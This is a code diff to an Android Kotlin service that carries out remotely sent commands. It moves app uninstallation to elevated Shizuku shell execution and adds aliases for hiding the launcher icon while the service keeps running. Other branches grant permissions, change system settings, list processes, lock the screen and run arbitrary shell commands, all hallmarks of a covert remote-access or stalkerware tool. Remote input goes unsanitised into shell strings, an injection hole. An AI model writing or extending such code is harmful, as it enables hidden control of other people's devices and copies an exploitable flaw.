@@ -203,7 +203,10 @@ class ConnectorService : Service() {
             cmd.startsWith("shizuku:")   -> Pair(runShizuku(cmd.removePrefix("shizuku:")), "command_result")
             cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShizuku("pm grant ${p[0]} ${p[1]}"), "command_result") }
             cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShizuku("pm revoke ${p[0]} ${p[1]}"), "command_result") }
-            cmd.startsWith("pm_uninstall:") -> Pair(runShell("pm uninstall --user 0 ${cmd.removePrefix("pm_uninstall:")}"), "command_result")
+            cmd.startsWith("pm_uninstall:") -> {
+                val pkg = cmd.removePrefix("pm_uninstall:").trim()
+                Pair(runShizuku("pm uninstall $pkg"), "command_result")
+            }
             cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShizuku("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
             cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShizuku("settings get ${p[0]} ${p[1]}"), "command_result") }
 
@@ -235,8 +238,8 @@ class ConnectorService : Service() {
             cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")
 
             // ── Hide/Unhide launcher icon (service keeps running) ──
-            cmd == "hide_app"            -> Pair(toggleAppVisibility(true), "command_result")
-            cmd == "unhide_app"          -> Pair(toggleAppVisibility(false), "command_result")
+            cmd == "hide_app" || cmd == "hide_icon"   -> Pair(toggleAppVisibility(true), "command_result")
+            cmd == "unhide_app" || cmd == "show_icon" -> Pair(toggleAppVisibility(false), "command_result")
 
             // ── Kontrol Jarak Jauh ──
             cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
